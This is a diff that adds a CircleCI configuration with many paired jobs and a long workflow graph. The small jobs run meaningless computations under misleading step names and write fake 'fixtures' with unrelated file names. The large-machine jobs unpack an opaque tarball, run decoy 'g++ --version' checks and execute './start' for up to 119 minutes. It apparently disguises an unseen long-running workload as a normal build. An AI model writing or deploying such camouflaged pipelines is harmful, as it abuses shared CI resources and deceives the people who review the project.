+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/99.log > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  install_py311-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 230227 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/.wsp/pt-D.pickle
+            echo "fixture persisted: $(du -b /tmp/.wsp/pt-D.pickle | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-D.pickle
+  py311-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/pt-D.pickle > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  reload_jul13-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reconcile output files
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 410638 | md5sum; true ; } > /tmp/.wsp/handoff.ok
+            echo "fixture persisted: $(du -b /tmp/.wsp/handoff.ok | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handoff.ok
+  jul13-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/handoff.ok > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  prefetch_refactor-9572:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=2900 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/bundle.tar
+            echo "fixture persisted: $(du -b /tmp/.wsp/bundle.tar | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle.tar
+  refactor-9572:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/bundle.tar > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  route_UAT_INIT_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 2100 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/.wsp/2024-02-21.data
+            echo "fixture persisted: $(du -b /tmp/.wsp/2024-02-21.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-02-21.data
+  UAT_INIT_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  warmup_biuld-27:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=302695;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/.wsp/timings.csv
+            echo "fixture persisted: $(du -b /tmp/.wsp/timings.csv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.csv
+  biuld-27:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  stepB_Ship_Tests1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 23160; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/metrics.csv
+            echo "fixture persisted: $(du -b /tmp/.wsp/metrics.csv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - metrics.csv
+  Ship_Tests1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/metrics.csv > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  cache_UAT_STAGE_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 293591 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/.wsp/614a.txt
+            echo "fixture persisted: $(du -b /tmp/.wsp/614a.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 614a.txt
+  UAT_STAGE_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/614a.txt > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+
+  env_v4-ga1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 28784); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/.wsp/full_step_output.out
+            echo "fixture persisted: $(du -b /tmp/.wsp/full_step_output.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_step_output.out
+  retry_send-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 29000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/.wsp/99.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/99.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 99.log
+  do_anothr-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=26 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/.wsp/95.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/95.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 95.log
+  enqueue_dotnet8-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 29920 | factor | wc -l; true ; } > /tmp/.wsp/FINAL.txt
+            echo "fixture persisted: $(du -b /tmp/.wsp/FINAL.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL.txt
+  generate_intergration_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 163840 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/55.out
+            echo "fixture persisted: $(du -b /tmp/.wsp/55.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 55.out
+  blue_refactor-9572_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 15894); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/.wsp/bundle.tar
+            echo "fixture persisted: $(du -b /tmp/.wsp/bundle.tar | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle.tar
+  linter_break-prod_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 81050 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/.wsp/pt-E.pt
+            echo "fixture persisted: $(du -b /tmp/.wsp/pt-E.pt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-E.pt
+  g2_jul13-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 65478 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/.wsp/handoff.ok
+            echo "fixture persisted: $(du -b /tmp/.wsp/handoff.ok | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handoff.ok
+workflows:
+  workflow:
+    jobs:
+      - p1_v4-ga1
+      - env_v4-ga1_2:
+          requires:
+            - p1_v4-ga1
+      - v4-ga1:
+          requires:
+            - env_v4-ga1_2
+      - ctx_send-it:
+          requires:
+            - env_v4-ga1_2
+      - retry_send-it_2:
+          requires:
+            - ctx_send-it
+      - send-it:
+          requires:
+            - retry_send-it_2
+      - prefetch_anothr-run:
+          requires:
+            - retry_send-it_2
+      - do_anothr-run_2:
+          requires:
+            - prefetch_anothr-run
+      - anothr-run:
+          requires:
+            - do_anothr-run_2
+      - staging_dotnet8-ship:
+          requires:
+            - do_anothr-run_2
+      - enqueue_dotnet8-ship_2:
+          requires:
+            - staging_dotnet8-ship
+      - dotnet8-ship:
+          requires:
+            - enqueue_dotnet8-ship_2
+      - fetcher_intergration:
+          requires:
+            - enqueue_dotnet8-ship_2
+      - generate_intergration_2:
+          requires:
+            - fetcher_intergration
+      - intergration:
+          requires:
+            - generate_intergration_2
+      - prefetch_refactor-9572:
+          requires:
+            - generate_intergration_2
+      - blue_refactor-9572_2:
+          requires:
+            - prefetch_refactor-9572
+      - refactor-9572:
+          requires:
+            - blue_refactor-9572_2
+      - tester_break-prod:
+          requires:
+            - blue_refactor-9572_2
+      - linter_break-prod_2:
+          requires:
+            - tester_break-prod
+      - break-prod:
+          requires:
+            - linter_break-prod_2
+      - reload_jul13-release:
+          requires:
+            - linter_break-prod_2
+      - g2_jul13-release_2:
+          requires:
+            - reload_jul13-release
+      - jul13-release:
+          requires:
+            - g2_jul13-release_2
+      - g2_v3-beta
+      - route_UAT_INIT_3
+      - ctx_green-light
+      - v3-beta:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - UAT_INIT_3:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - green-light:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - mike:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - sanity:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - Launch_App8:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - biuld-27:
+          requires:
+            - g2_v3-beta
+            - route_UAT_INIT_3
+            - ctx_green-light
+      - postbuild_VerifyStaging
+      - VerifyStaging:
+          requires:
+            - postbuild_VerifyStaging
+      - install_py311-cov:
+          requires:
+            - postbuild_VerifyStaging
+      - py311-cov:
+          requires:
+            - install_py311-cov
+      - prefetch_strated:
+          requires:
+            - install_py311-cov
+      - strated:
+          requires:
+            - prefetch_strated
+      - B_q2-canary:
+          requires:
+            - prefetch_strated
+      - q2-canary:
+          requires:
+            - B_q2-canary
+      - A_foxtrot:
+          requires:
+            - B_q2-canary
+      - foxtrot:
+          requires:
+            - A_foxtrot
+      - canary1_v2-edge3:
+          requires:
+            - A_foxtrot
+      - v2-edge3:
+          requires:
+            - canary1_v2-edge3
+      - loader_QA_DEPLOY_3:
+          requires:
+            - canary1_v2-edge3
+      - QA_DEPLOY_3:
+          requires:
+            - loader_QA_DEPLOY_3
+      - green_artifacts:
+          requires:
+            - loader_QA_DEPLOY_3
+      - artifacts:
+          requires:
+            - green_artifacts
+      - audit_go1-21-bench:
+          requires:
+            - green_artifacts
+      - go1-21-bench:
+          requires:
+            - audit_go1-21-bench
+      - rerun_update-login
+      - update-login:
+          requires:
+            - rerun_update-login
+      - audit_wip-edge:
+          requires:
+            - rerun_update-login
+      - wip-edge:
+          requires:
+            - audit_wip-edge
+      - stepB_rust-cov:
+          requires:
+            - audit_wip-edge
+      - rust-cov:
+          requires:
+            - stepB_rust-cov
+      - cache_UAT_STAGE_6:
+          requires:
+            - stepB_rust-cov
+      - UAT_STAGE_6:
+          requires:
+            - cache_UAT_STAGE_6
+      - canary_succes-only
+      - succes-only:
+          requires:
+            - canary_succes-only
+      - stepB_Ship_Tests1:
+          requires:
+            - canary_succes-only
+      - Ship_Tests1:
+          requires:
+            - stepB_Ship_Tests1
